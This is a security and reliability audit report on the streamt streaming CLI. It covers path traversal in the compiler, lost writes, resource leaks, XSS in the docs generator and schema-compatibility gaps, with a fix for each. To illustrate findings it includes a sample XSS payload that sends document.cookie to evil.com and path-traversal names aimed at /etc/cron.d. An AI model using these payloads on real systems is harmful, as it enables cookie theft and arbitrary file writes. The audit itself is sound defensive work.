# Storage Fault Audit -- Findings

**Auditor:** Storage Fault Auditor
**Scope:** File I/O, hash persistence, resource lifecycle, serialization, YAML parsing, path safety, HTML output
**Date:** 2026-03-13
**Codebase snapshot:** commit d4032f9 (main)

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 1     |
| HIGH     | 4     |
| MEDIUM   | 5     |
| LOW      | 2     |

---

## CRITICAL Severity

### C1. Path traversal via user-controlled names in compiled artifact output

**Antithesis Term**: Path Traversal
**Confidence**: High
**File**: `src/streamt/compiler/compiler.py:947-985`
**Code**:
```python
path = schemas_dir / f"{schema.subject}.json"       # line 947
path = topics_dir / f"{topic.name}.json"             # line 955
sql_path = flink_dir / f"{job.name}.sql"             # line 964
config_path = flink_dir / f"{job.name}.json"         # line 968
path = connect_dir / f"{connector.name}.json"        # line 976
path = gateway_dir / f"{rule.name}.json"             # line 985
```
**Guard Check**: Verified: `Source.name`, `Model.name`, `DataTest.name`, and all artifact name fields (`TopicArtifact.name`, `FlinkJobArtifact.name`, `SchemaArtifact.subject`, etc.) have NO validation for path-unsafe characters. No `field_validator` on `name` in `src/streamt/core/models.py:290`, `395`, `719`, or `src/streamt/compiler/manifest.py:13-113`. The `GatewayDeployer.apply` validates names with `_VALID_RESOURCE_NAME` regex (gateway.py:365), but this check happens only at deploy time, not at compile time, and only for gateway rules. Yes
**Attack Scenario**: A YAML project file defines a source with `name: "../../etc/cron.d/backdoor"` or `topic: "../../../tmp/evil"`. When `streamt compile` runs, `_write_artifacts` writes files outside the intended `generated/` directory. In a CI pipeline where the project YAML comes from a pull request, this enables arbitrary file writes on the build agent.
**Remediation**: Add a name validator to all Pydantic models and artifact dataclasses that rejects names containing `/`, `\`, `..`, or null bytes. Alternatively, sanitize names in `_write_artifacts` by replacing path separators. Recommended pattern:
```python
import re
SAFE_NAME = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9._-]*$")

@field_validator("name")
@classmethod
def validate_name(cls, v: str) -> str:
    if not SAFE_NAME.match(v):
        raise ValueError(f"Unsafe name '{v}': must be alphanumeric with dots, hyphens, underscores")
    return v
```

---

## HIGH Severity

### H1. Lost writes -- no fsync before atomic rename

**Antithesis Term**: Lost Write
**Confidence**: High
**File**: `src/streamt/deployer/flink.py:449-467` (`_save_hashes`)
**Code**:
```python
fd = tempfile.NamedTemporaryFile(
    mode="w", dir=path.parent, suffix=".tmp", delete=False,
)
try:
    _json.dump(self._sql_hashes, fd)
    fd.close()                         # no flush/fsync
    Path(fd.name).replace(path)        # rename before data is on disk
```
**Guard Check**: Searched for `fsync`, `flush` across entire `src/streamt/` -- zero results. Yes
**Attack Scenario**: Power failure during `streamt apply`. The OS page cache holds the JSON data but it has not been flushed to the storage device. After reboot, `flink_hashes.json` is zero-length or contains partial JSON. Next `_load_hashes` hits the `except Exception` branch, silently resets all hashes, and every job appears as "cannot detect SQL changes" -- either re-deploying unnecessarily or missing actual SQL drift.
**Remediation**: Add `fd.flush()` and `os.fsync(fd.fileno())` before `fd.close()`:
```python
_json.dump(self._sql_hashes, fd)
fd.flush()
os.fsync(fd.fileno())
fd.close()
Path(fd.name).replace(path)
```

---

### H2. File descriptor leak in `_save_hashes` error path

**Antithesis Term**: Resource Leak
**Confidence**: High
**File**: `src/streamt/deployer/flink.py:455-467`
**Code**:
```python
fd = tempfile.NamedTemporaryFile(
    mode="w", dir=path.parent, suffix=".tmp", delete=False,
)
try:
    _json.dump(self._sql_hashes, fd)
    fd.close()
    Path(fd.name).replace(path)
except Exception:
    logger.debug("Failed to save hashes to %s", path)
    try:
        Path(fd.name).unlink(missing_ok=True)   # unlinks, but fd still open
    except Exception:
        pass
    # fd is NEVER closed in the except path
```
**Guard Check**: The `NamedTemporaryFile` is created with `delete=False`, so Python will not auto-close it. If `_json.dump` raises (disk full, encoding error), the file descriptor leaks. The `unlink` call removes the directory entry but the inode persists until the FD is closed (Linux). Yes
**Attack Scenario**: Repeated `streamt apply` calls on a system with a full or read-only `.streamt/` directory. Each call leaks one file descriptor. After ~1024 calls (default ulimit), the process hits `OSError: [Errno 24] Too many open files`.
**Remediation**: Use a `finally` block to ensure `fd` is closed:
```python
try:
    _json.dump(self._sql_hashes, fd)
    fd.flush()
    os.fsync(fd.fileno())
    fd.close()
    Path(fd.name).replace(path)
except Exception:
    logger.debug("Failed to save hashes to %s", path)
    fd.close()
    try:
        Path(fd.name).unlink(missing_ok=True)
    except Exception:
        pass
```

---

### H3. Consumer resource leak in `get_topic_message_count`

**Antithesis Term**: Resource Leak
**Confidence**: High
**File**: `src/streamt/deployer/kafka.py:414-442`
**Code**:
```python
try:
    consumer = Consumer(consumer_config)
    total = 0
    for partition in range(partition_count):
        tp = TopicPartition(topic, partition)
        low, high = consumer.get_watermark_offsets(tp, timeout=DEFAULT_TIMEOUT)
        total += high - low
    consumer.close()          # only reached on success
    return total
except Exception as e:        # consumer never closed
    logger.warning(...)
    return 0
```
**Guard Check**: The sibling method `get_consumer_group_lag` (same file, lines 374-380) correctly uses `try/finally` with `consumer.close()`. This method does not. Yes
**Attack Scenario**: `streamt status --lag` with a cluster experiencing intermittent connectivity. Each `get_watermark_offsets` timeout leaks a `Consumer` (socket + librdkafka background thread). With many topics, the process quickly exhausts file descriptors or threads.
**Remediation**: Move `consumer.close()` into a `finally` block:
```python
consumer = Consumer(consumer_config)
try:
    total = 0
    for partition in range(partition_count):
        tp = TopicPartition(topic, partition)
        low, high = consumer.get_watermark_offsets(tp, timeout=DEFAULT_TIMEOUT)
        total += high - low
    return total
except Exception as e:
    logger.warning(...)
    return 0
finally:
    consumer.close()
```

---

### H4. FlinkDeployer resource leak in `TestRunner._run_continuous_test`

**Antithesis Term**: Resource Leak
**Confidence**: High
**File**: `src/streamt/testing/runner.py:199`
**Code**:
```python
deployer = FlinkDeployer(cluster.rest_url)
job_state = deployer.get_job_state(f"test_{test.name}")
# ... no close()
```
**Guard Check**: All other FlinkDeployer usage in CLI commands (`apply.py:113`, `status.py:151`, `plan.py`) passes through `make_flink_deployer` and `close_deployers`. This is the only site that creates a deployer without cleanup. Yes
**Attack Scenario**: `streamt test` with multiple continuous tests. Each test leaks a `requests.Session` (TCP connection pool to Flink cluster). The connections persist until garbage collection, holding sockets open nondeterministically.
**Remediation**: Use the context manager:
```python
with FlinkDeployer(cluster.rest_url) as deployer:
    job_state = deployer.get_job_state(f"test_{test.name}")
```

---

## MEDIUM Severity

### M1. XSS in HTML documentation generator -- no HTML escaping

**Antithesis Term**: Injection
**Confidence**: High
**File**: `src/streamt/docs/generator.py:710-768`
**Code**:
```python
sources_html += f"""
    <h3 class="card-title">{source.name}</h3>
    <p class="card-description">{source.description or 'No description'}</p>
    <div class="card-meta">
        <span>Topic: {source.topic}</span>
```
**Guard Check**: No `html.escape` or `markupsafe` import anywhere in `src/streamt/docs/`. User-controlled values (`source.name`, `source.description`, `source.topic`, `source.owner`, `model.name`, `model.description`, `test.name`, `exposure.name`, `exposure.description`, `project.project.name`) are all interpolated into HTML without escaping. Yes
**Attack Scenario**: A YAML project file contains `name: "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"`. Running `streamt docs` generates an HTML file with executable JavaScript. If the docs are hosted (e.g., on an internal portal or GitHub Pages), anyone opening them executes the script.
**Remediation**: Import `html.escape` and wrap all user-controlled values:
```python
from html import escape
sources_html += f"""
    <h3 class="card-title">{escape(source.name)}</h3>
    <p class="card-description">{escape(source.description or 'No description')}</p>
```

---

### M2. Manifest and artifact writes are not atomic

**Antithesis Term**: Torn Write
**Confidence**: High
**File**: `src/streamt/compiler/manifest.py:147-151`, `src/streamt/compiler/compiler.py:937-991`
**Code**:
```python
# manifest.py
def save(self, path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w") as f:
        f.write(self.to_json())

# compiler.py -- same pattern for all artifacts:
with open(path, "w") as f:
    json.dump(schema.to_dict(), f, indent=2)
```
**Guard Check**: Unlike `_save_hashes` in flink.py which uses tempfile+rename, none of the compiler output writes use atomic patterns. Yes
**Attack Scenario**: `streamt compile` is interrupted (Ctrl+C, OOM kill, CI timeout) while writing `generated/flink/my_model.sql`. The file is left truncated. A subsequent `streamt apply` reads this truncated SQL and submits it to Flink, which either fails with a confusing parse error or -- worse -- deploys a partial query.
**Remediation**: Use tempfile+rename for all writes, or write to a temp directory and rename the entire directory:
```python
def save(self, path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp = path.with_suffix(".tmp")
    with open(tmp, "w") as f:
        f.write(self.to_json())
    tmp.replace(path)
```

---

### M3. No JSON corruption detection beyond parse failure

**Antithesis Term**: Silent Corruption
**Confidence**: Medium
**File**: `src/streamt/deployer/flink.py:437-447` (`_load_hashes`)
**Code**:
```python
try:
    data = _json.loads(path.read_text())
    if isinstance(data, dict):
        self._sql_hashes.update(data)
except Exception:
    logger.warning("Corrupt state file %s -- starting with empty hashes", path)
```
**Guard Check**: No checksum, no schema validation of hash values. A file containing `{"job": 123}` (integer instead of hex string) passes the `isinstance(data, dict)` check but later comparisons with `_sql_hash()` (which returns 16-char hex) will never match, making every job appear "changed". Yes
**Attack Scenario**: Bit-rot or partial write corrupts the JSON values (not the keys). All jobs are re-deployed unnecessarily on next `streamt apply`, causing service interruption.
**Remediation**: Validate that all values match the expected format (`^[0-9a-f]{16}$`). Back up the corrupt file before overwriting:
```python
for k, v in data.items():
    if isinstance(v, str) and len(v) == 16:
        self._sql_hashes[k] = v
    else:
        logger.warning("Ignoring invalid hash for job '%s': %r", k, v)
```

---

### M4. Pydantic models accept extra fields silently

**Antithesis Term**: Silent Data Loss
**Confidence**: High
**File**: `src/streamt/core/models.py` (Source:288, Model:392, DataTest:716)
**Code**:
```python
class Source(BaseModel):
    model_config = ConfigDict(populate_by_name=True)
    # no extra="forbid"
```
**Guard Check**: Checked all Pydantic models in `models.py` and runtime config models. None use `extra="forbid"`. Yes
**Attack Scenario**: A user writes `boostrap_servers: localhost:9092` (typo) in their YAML. Pydantic silently ignores it. The default value (`None` or a fallback) is used instead. The user gets a confusing connection error with no indication that their config key was misspelled.
**Remediation**: Add `model_config = ConfigDict(extra="forbid")` to all configuration models, especially `RuntimeConfig`, `KafkaConfig`, `FlinkClusterConfig`, `ConnectClusterConfig`, and `GatewayConfig`.

---

### M5. Schema compatibility bypass when compatibility level and schema change simultaneously

**Antithesis Term**: Consistency Violation
**Confidence**: Medium
**File**: `src/streamt/deployer/schema_registry.py:312-326`
**Code**:
```python
# update path:
if change.changes and "compatibility" in change.changes:
    self.set_compatibility(artifact.subject, artifact.compatibility)  # step 1
if change.changes and "schema" in change.changes:
    self.register_schema(...)                                         # step 2
```
**Guard Check**: `plan_schema` runs `check_compatibility` (line 251) against the OLD compatibility level. But `apply_schema` changes the level first (step 1) and then registers (step 2). A schema that would be incompatible under BACKWARD_TRANSITIVE can be registered by simultaneously downgrading to NONE. Also, if step 1 succeeds but step 2 fails, the subject is left with a changed compatibility level but no new schema. Yes
**Attack Scenario**: A developer changes compatibility from FULL to NONE and makes a breaking schema change in the same commit. The compatibility check passes because it ran against the old level, but the deploy succeeds because the level was already changed. Downstream consumers break on the incompatible schema.
**Remediation**: Run compatibility check against the *original* level. If the schema would be incompatible under the old level, require explicit `--force` or block. Alternatively, register the schema first, then change compatibility.

---

## LOW Severity

### L1. No size limits on YAML or SQL input

**Antithesis Term**: Denial of Service
**Confidence**: Low
**File**: `src/streamt/core/parser.py:143-149`
**Code**:
```python
def _load_yaml(self, path: Path) -> dict[str, object]:
    try:
        with open(path) as f:
            content = f.read()
        return yaml.safe_load(content) or {}
```
**Guard Check**: No file size check before reading. No limit on number of sources/models/tests. Yes
**Attack Scenario**: In a CI environment where project definitions come from user input, a 100MB YAML file causes OOM. Low risk in typical single-user CLI usage.
**Remediation**: Add a maximum file size check (e.g., 10MB) before reading YAML files.

---

### L2. Compiler output not cleaned before writing (stale artifacts)

**Antithesis Term**: Stale State
**Confidence**: High
**File**: `src/streamt/compiler/compiler.py:937-991`
**Code**: `_write_artifacts` creates directories and writes files but does not remove files from previous compilations.
**Guard Check**: No cleanup code found. Yes
**Attack Scenario**: A model is removed from the project YAML. Its compiled `.sql` and `.json` files persist in `generated/`. A downstream tool or operator that scans the output directory may attempt to deploy the deleted model.
**Remediation**: Clear output subdirectories before writing, or track written files and remove orphans. The simplest approach: delete and recreate the output directory at the start of `_write_artifacts`.

---

## Items Verified as Correct

1. **YAML safety**: All YAML loading uses `yaml.safe_load` -- no deserialization attacks possible. Verified in `parser.py:147` and `environment.py:235`.
2. **HTTP session lifecycle**: `FlinkDeployer`, `SchemaRegistryDeployer`, `ConnectDeployer`, and `GatewayDeployer` all implement `__enter__`/`__exit__` and `close()`. CLI commands use `close_deployers()` in `finally` blocks.
3. **Environment name validation**: `EnvironmentManager.validate_env_name` (environment.py:160-163) rejects path traversal with regex `^[a-zA-Z0-9][a-zA-Z0-9-]*$` and explicit `..`, `/`, `\` checks.
4. **SSL file path validation**: `validate_ssl_path` in `validators.py` checks file existence at parse time.
5. **Atomic hash write structure**: The tempfile+rename pattern in `_save_hashes` is structurally correct for atomicity -- gaps are durability (no fsync) and resource cleanup (no fd.close in error path), addressed in H1 and H2.
6. **dotenv loading**: `dotenv_values()` is used safely -- the env_name is validated before constructing the path, and `dotenv_values` only reads key=value pairs.
7. **Init command YAML write**: `yaml.dump` serializes only safe Python types (dicts, strings). No injection risk.
8. **Gateway resource name validation**: `GatewayDeployer.apply` validates names with `_VALID_RESOURCE_NAME` regex (gateway.py:358-369) before API calls. Only the compile-time file writes lack equivalent validation (see C1).
